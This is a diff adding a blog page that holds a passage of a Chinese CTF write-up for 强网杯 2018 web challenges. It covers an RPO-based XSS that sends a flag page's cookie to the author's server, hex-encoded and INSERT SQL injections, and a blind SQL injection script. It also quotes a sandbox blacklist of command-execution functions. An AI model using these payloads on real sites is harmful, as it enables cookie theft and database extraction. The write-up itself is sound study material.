@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta property="og:description" content="">
+    <meta property="og:type" content="website">
+    <meta name="description" content="">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        强网杯 Web Write Up - undefined
+        
+    </title>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/aircloud.css">
+
+    
+<link rel="stylesheet" href="/css/gitment.css">
+
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_28hi1hpxx24.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i>  </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/img/avatar.jpeg" />
+        </div>
+        <div class="name">
+            <i>seaii</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li >
+                <a href="/collect/">
+                    <i class="iconfont icon-shoucang1"></i>
+                    <span>COLLECT</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web%E7%AD%BE%E5%88%B0"><span class="toc-text">web签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#share-your-mind"><span class="toc-text">share your mind</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#three-hit"><span class="toc-text">three hit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python-is-the-best-language-1-and-2"><span class="toc-text">python is the best language 1 and 2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5"><span class="toc-text">注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%95%99%E8%A8%80%E6%9D%BF%E5%A4%84insert%E6%B3%A8%E5%85%A5"><span class="toc-text">留言板处insert注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E5%A4%84%E9%82%AE%E7%AE%B1%E5%8F%82%E6%95%B0%E7%9B%B2%E6%B3%A8"><span class="toc-text">注册处邮箱参数盲注</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8"><span class="toc-text">沙盒逃逸</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">反序列化</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%A9%E8%9B%8B"><span class="toc-text">彩蛋</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E5%90%8E"><span class="toc-text">最后</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-bg" id="search-bg"></div>
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i>  </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        强网杯 Web Write Up
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2018-03-26 23:08:00</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#web" title="web">web</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#write up" title="write up">write up</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#强网杯" title="强网杯">强网杯</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>周末强网杯，做的不太好，心态崩了好几次。。。本来不打算写wp，想想还是整理一下吧，学到的知识点还是不少的。</p>
+<span id="more"></span>
+
+
+<h3 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h3><p>需要找两个MD5相同的字符串或者文件，在<a target="_blank" rel="noopener" href="https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value">这里</a>找到两个文件，将文件内容提交即可三关连过得到flag。</p>
+<h3 id="share-your-mind"><a href="#share-your-mind" class="headerlink" title="share your mind"></a>share your mind</h3><p>这题属实是让我心态崩了。。。</p>
+<p>首先利用rpo漏洞加载任意js代码，对于rpo，这里有几篇文章，不过多数是利用css的</p>
+<p><a target="_blank" rel="noopener" href="https://paper.tuisec.win/detail/bc9d4cf9fb640a8">深入剖析RPO漏洞</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.tuicool.com/articles/eIf6Vje">RPO攻击初探</a></p>
+<p><a target="_blank" rel="noopener" href="http://blog.nsfocus.net/rpo-attack/">【技术分析】RPO攻击技术浅析</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.bendawang.site/2017/09/16/RPO%E4%BA%8C%E4%B8%89%E4%BA%8B/">RPO二三事</a></p>
+<p>个人认为比较好理解的说法是这个：</p>
+<blockquote>
+<p>RPO漏洞，就是服务端和客户端对这个URL的解析不一致导致的</p>
+</blockquote>
+<p>回到题目，查看index.php页面发现加载了两个js文件</p>
+<p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///180326/5f1IA99iFi.png" alt="mark"></p>
+<p>一个使用了相对路径，一个使用了绝对路径，此时<code>jquery.min.js</code>的地址为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.107.33.96:20000/static/js/jquery.min.js</span><br></pre></td></tr></table></figure>
+
+<p>然后添加一篇文章，文章地址为<code>http://39.107.33.96:20000/index.php/view/article/723</code>，此时访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.107.33.96:20000/index.php/view/article/723/..%2f..%2f..%2f..%2findex.php</span><br></pre></td></tr></table></figure>
+
+<p>由于前后端差异，后端会将<code>%2f</code>urldecode为<code>/</code>，所以返回了index.php的内容，而前端会将<code>..%2f..%2f..%2f..%2findex.php</code>当作一个整体，那么此时这个页面加载的js的地址就变成了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.107.33.96:20000/index.php/view/article/723/static/js/jquery.min.js</span><br></pre></td></tr></table></figure>
+
+<p>由于后端实现了静态路由，上面的地址可以看作是这种形式:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.107.33.96:20000/index.php?controller=view&amp;method=article&amp;articleid=723&amp;p1=static&amp;p2=js&amp;p3=jquery.min.js</span><br></pre></td></tr></table></figure>
+
+<p>p1,p2,p3三个参数后端根本没有接收，发送过去也没有意义，所以返回的仍然是<code>http://39.107.33.96:20000/index.php/view/article/723</code>的内容。而文章内容是完全可控的，这样就实现了加载任意js代码。</p>
+<p>由于文章内容进行了过滤，使用eval(String.fromCharCode())这种方式来绕过。payload如下（别加题目。。。）：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;iframe&quot;</span>);</span><br><span class="line">a.<span class="property">src</span> = <span class="string">&quot;../../../../../QWB_fl4g/QWB/&quot;</span>;</span><br><span class="line">a.<span class="property">id</span> = <span class="string">&quot;frame&quot;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(a);</span><br><span class="line">a.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;http://seaii-blog.com:8000/index.php?file=&quot;</span>+<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;frame&quot;</span>).<span class="property">contentWindow</span>.<span class="property">document</span>.<span class="property">cookie</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先打的index页面的cookie，得到一个hint，需要得到<code>/QWB_fl4g/QWB/</code>的cookie。将上面的payload转换为eval(String.fromCharCode())的形式，添加到文章内容，然后在report页面发送如下url</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.107.33.96:20000/index.php/view/article/723/..%2f..%2f..%2f..%2findex.php</span><br></pre></td></tr></table></figure>
+
+<p>查看vps的log，就可以得到flag了。</p>
+<h3 id="three-hit"><a href="#three-hit" class="headerlink" title="three hit"></a>three hit</h3><p>注册时<strong>age</strong>参数存在二次注入，检测了age是否为数字，推测使用了<code>is_numeric</code>，这个函数传入hex值将会直接返回true。</p>
+<p>找库、找表的过程省略，直接上最后的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=seaii2&amp;age=0x3120616e6420313d3220554e494f4e2053454c45435420312c2853454c45435420666c61672066726f6d20666c6167292c332c3423&amp;password=123456</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///180326/aC4I37b9EG.png" alt="mark"></p>
+<h3 id="python-is-the-best-language-1-and-2"><a href="#python-is-the-best-language-1-and-2" class="headerlink" title="python is the best language 1 and 2"></a>python is the best language 1 and 2</h3><p>两道题用的一套源码，就合在一起写吧。flask写的，先从route.py看起</p>
+<h4 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h4><h5 id="留言板处insert注入"><a href="#留言板处insert注入" class="headerlink" title="留言板处insert注入"></a>留言板处insert注入</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    form = PostForm()</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        res = mysql.Add(<span class="string">&quot;post&quot;</span>, [<span class="string">&#x27;NULL&#x27;</span>, <span class="string">&quot;&#x27;%s&#x27;&quot;</span> % form.post.data,</span><br><span class="line">                                 <span class="string">&quot;&#x27;%s&#x27;&quot;</span> % current_user.<span class="built_in">id</span>, <span class="string">&quot;&#x27;%s&#x27;&quot;</span> % now()])</span><br><span class="line">        <span class="keyword">if</span> res == <span class="number">1</span>:</span><br><span class="line">            flash(<span class="string">&#x27;Your post is now live!&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"><span class="comment">#省略部分</span></span><br></pre></td></tr></table></figure>
+
+<p>这里是主页添加留言的地方，跟一下PostForm</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">PostForm</span>(<span class="title class_ inherited__">FlaskForm</span>):</span><br><span class="line">    post = StringField(<span class="string">&#x27;Say something&#x27;</span>, validators=[DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">&#x27;Submit&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到未做任何安全检查，继续向下，跟进Add函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Add</span>(<span class="params">self, tablename, values</span>):</span><br><span class="line">        sql = <span class="string">&quot;insert into &quot;</span> + tablename + <span class="string">&quot; &quot;</span></span><br><span class="line">        sql += <span class="string">&quot;values (&quot;</span></span><br><span class="line">        sql += <span class="string">&quot;&quot;</span>.join(i + <span class="string">&quot;,&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> values)[:-<span class="number">1</span>]</span><br><span class="line">        sql += <span class="string">&quot;)&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.db_session.execute(sql)</span><br><span class="line">            self.db_session.commit()</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p>同样未做任何过滤，简单粗暴直接拼接，上下看看，这个操作类封装的方法基本都是拼接直接执行。</p>
+<p>提交这样一条留言：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9528&#x27;,&#x27;1&#x27;,&#x27;2018-03-25&#x27;),(&#x27;NULL&#x27;,(select flllllag from flaaaaag),&#x27;1&#x27;,&#x27;2018-03-25&#x27;)#</span><br></pre></td></tr></table></figure>
+
+<p>这样做有两个缺点，一个是flag会直接显示出来，大家都能看到；另一个就是不知道自己的user_id，会将留言添加到其他用户上，不太好找，好在还有一个follow的功能。</p>
+<h5 id="注册处邮箱参数盲注"><a href="#注册处邮箱参数盲注" class="headerlink" title="注册处邮箱参数盲注"></a>注册处邮箱参数盲注</h5><p>接着是注册</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    form = RegistrationForm()</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        res = mysql.Add(<span class="string">&quot;user&quot;</span>, [<span class="string">&quot;NULL&quot;</span>, <span class="string">&quot;&#x27;%s&#x27;&quot;</span> % form.username.data, <span class="string">&quot;&#x27;%s&#x27;&quot;</span> % form.email.data,</span><br><span class="line">                                 <span class="string">&quot;&#x27;%s&#x27;&quot;</span> % generate_password_hash(form.password.data), <span class="string">&quot;&#x27;&#x27;&quot;</span>, <span class="string">&quot;&#x27;%s&#x27;&quot;</span> % now()])</span><br><span class="line">        <span class="keyword">if</span> res == <span class="number">1</span>:</span><br><span class="line">            flash(<span class="string">&#x27;Congratulations, you are now a registered user!&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, title=<span class="string">&#x27;Register&#x27;</span>, form=form)</span><br></pre></td></tr></table></figure>
+
+<p>跟进RegistrationForm</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">RegistrationForm</span>(<span class="title class_ inherited__">FlaskForm</span>):</span><br><span class="line">    username = StringField(<span class="string">&#x27;Username&#x27;</span>, validators=[DataRequired()])</span><br><span class="line">    email = StringField(<span class="string">&#x27;Email&#x27;</span>, validators=[DataRequired(), Email()])</span><br><span class="line">    password = PasswordField(<span class="string">&#x27;Password&#x27;</span>, validators=[DataRequired()])</span><br><span class="line">    password2 = PasswordField(</span><br><span class="line">        <span class="string">&#x27;Repeat Password&#x27;</span>, validators=[DataRequired(), EqualTo(<span class="string">&#x27;password&#x27;</span>)])</span><br><span class="line">    submit = SubmitField(<span class="string">&#x27;Register&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">validate_username</span>(<span class="params">self, username</span>):</span><br><span class="line">        <span class="keyword">if</span> re.<span class="keyword">match</span>(<span class="string">&quot;^[a-zA-Z0-9_]+$&quot;</span>, username.data) == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">&#x27;username has invalid charactor!&#x27;</span>)</span><br><span class="line">        user = mysql.One(<span class="string">&quot;user&quot;</span>, &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;&#x27;%s&#x27;&quot;</span> % username.data&#125;, [<span class="string">&quot;id&quot;</span>])</span><br><span class="line">        <span class="keyword">if</span> user != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">&#x27;Please use a different username.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">validate_email</span>(<span class="params">self, email</span>):</span><br><span class="line">        user = mysql.One(<span class="string">&quot;user&quot;</span>, &#123;<span class="string">&quot;email&quot;</span>:  <span class="string">&quot;&#x27;%s&#x27;&quot;</span> % email.data&#125;, [<span class="string">&quot;id&quot;</span>])</span><br><span class="line">        <span class="keyword">if</span> user != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">&#x27;Please use a different email address.&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>username限制的比较死，email经过一个<code>Email()</code>的验证，继续跟进，这个需要看wtforms的源码</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/wtforms/wtforms/blob/master/wtforms/validators.py">https://github.com/wtforms/wtforms/blob/master/wtforms/validators.py</a></p>
+<p>篇幅问题就不贴代码了，大体流程就是将email按<code>@</code>分割，前半部分使用下面的正则匹配。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user_regex = re.<span class="built_in">compile</span>(</span><br><span class="line">        <span class="string">r&quot;(^[-!#$%&amp;&#x27;*+/=?^_`&#123;&#125;|~0-9A-Z]+(\.[-!#$%&amp;&#x27;*+/=?^_`&#123;&#125;|~0-9A-Z]+)*\Z&quot;</span>  <span class="comment"># dot-atom</span></span><br><span class="line">        <span class="string">r&#x27;|^&quot;([\001-\010\013\014\016-\037!#-\[\]-\177]|\\[\001-\011\013\014\016-\177])*&quot;\Z)&#x27;</span>,  <span class="comment"># quoted-string</span></span><br><span class="line">        re.IGNORECASE)</span><br></pre></td></tr></table></figure>
+
+<p>还是比较宽松的，空格不能用我们可以用<code>/**/</code>来绕过。上面提到过，One函数同样没有安全过滤。但是此处无法回显数据，我们可个构造布尔条件进行盲注。</p>
+<p><strong>代码来自chybeta师傅的<a target="_blank" rel="noopener" href="https://xianzhi.aliyun.com/forum/topic/2219">wp</a></strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://39.107.32.29:20000/register&quot;</span></span><br><span class="line"></span><br><span class="line">r = requests.get(url)</span><br><span class="line">soup = BeautifulSoup(r.text,<span class="string">&quot;html5lib&quot;</span>)</span><br><span class="line">token = soup.find_all(<span class="built_in">id</span>=<span class="string">&#x27;csrf_token&#x27;</span>)[<span class="number">0</span>].get(<span class="string">&quot;value&quot;</span>)</span><br><span class="line"></span><br><span class="line">notice = <span class="string">&quot;Please use a different email address.&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">&quot;(SELECT/**/GROUP_CONCAT(schema_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA)&quot;</span></span><br><span class="line">tables = <span class="string">&quot;(SELECT/**/GROUP_CONCAT(table_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.TABLES/**/WHERE/**/TABLE_SCHEMA=DATABASE())&quot;</span></span><br><span class="line">columns = <span class="string">&quot;(SELECT/**/GROUP_CONCAT(column_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/WHERE/**/TABLE_NAME=0x666c616161616167)&quot;</span></span><br><span class="line">data = <span class="string">&quot;(SELECT/**/GROUP_CONCAT(flllllag/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/flaaaaag)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        payload = <span class="string">&quot;test&#x27;/**/or/**/ascii(substr(&quot;</span>+  data +<span class="string">&quot;,%d,1))=%d#/**/@chybeta.com&quot;</span> % (i,j)</span><br><span class="line">        <span class="built_in">print</span> payload</span><br><span class="line">        post_data = &#123;</span><br><span class="line">            <span class="string">&#x27;csrf_token&#x27;</span>: token,</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;email&#x27;</span>:payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password2&#x27;</span>:<span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;submit&#x27;</span>:<span class="string">&#x27;Register&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=post_data)</span><br><span class="line">        soup = BeautifulSoup(r.text,<span class="string">&quot;html5lib&quot;</span>)</span><br><span class="line">        token = soup.find_all(<span class="built_in">id</span>=<span class="string">&#x27;csrf_token&#x27;</span>)[<span class="number">0</span>].get(<span class="string">&quot;value&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> notice <span class="keyword">in</span> r.text:</span><br><span class="line">            result += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span> result</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="沙盒逃逸"><a href="#沙盒逃逸" class="headerlink" title="沙盒逃逸"></a>沙盒逃逸</h4><p>第一关算是过了，继续审计</p>
+<p>在other.py看到一个黑名单</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">black_type_list = [<span class="built_in">eval</span>, execfile, <span class="built_in">compile</span>, system, <span class="built_in">open</span>, file, popen, popen2, popen3, popen4, fdopen, tmpfile, fchmod, fchown, pipe, chdir, fchdir, chroot, chmod, chown, link, lchown, listdir, lstat, mkfifo, mknod, mkdir, makedirs, readlink, remove, removedirs, rename, renames, rmdir, tempnam, tmpnam, unlink, walk, execl, execle, execlp, execv, execve, execvp, execvpe, exit, fork, forkpty, kill, nice, spawnl, spawnle, spawnlp, spawnlpe, spawnv, spawnve, spawnvp, spawnvpe, load, loads]</span><br></pre></td></tr></table></figure>
+
+<p>推测会有命令执行，python可以执行系统命令的库有很多如<code>subprocess.Popen()</code>、<code>commands.getoutput()</code>等。</p>
+<h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>首先寻找使用black_type_list的地方</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_hook_call</span>(<span class="params">func</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="built_in">print</span> args[<span class="number">0</span>].stack</span><br><span class="line">        <span class="keyword">if</span> args[<span class="number">0</span>].stack[-<span class="number">2</span>] <span class="keyword">in</span> black_type_list:</span><br><span class="line">            <span class="keyword">raise</span> FilterException(args[<span class="number">0</span>].stack[-<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">file</span>):</span><br><span class="line">    unpkler = Unpkler(file)</span><br><span class="line">    unpkler.dispatch[REDUCE] = _hook_call(unpkler.dispatch[REDUCE])</span><br><span class="line">    <span class="keyword">return</span> Unpkler(file).load()</span><br></pre></td></tr></table></figure>
+
+<p>然后全局搜索调用load函数的地方，发现Mycache.py的FileSystemCache类中的<code>has(),get(),_prune()</code>三个方法使用了load函数。</p>
+<p>继续搜索，Mysessions.py中的<code>FileSystemSessionInterface</code>类实例化了<code>FileSystemCache</code>。在FileSystemSessionInterface的open_session方法中调用了FileSystemCache的get方法。</p>
+<p>Mysessions.py是自己实现的一套session接口，在<code>__init.py__</code>中指定</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.session_interface = FileSystemSessionInterface(</span><br><span class="line">    app.config[<span class="string">&#x27;SESSION_FILE_DIR&#x27;</span>], app.config[<span class="string">&#x27;SESSION_FILE_THRESHOLD&#x27;</span>],</span><br><span class="line">    app.config[<span class="string">&#x27;SESSION_FILE_MODE&#x27;</span>])</span><br></pre></td></tr></table></figure>
+
+<p>下面看一下open_session方法</p>
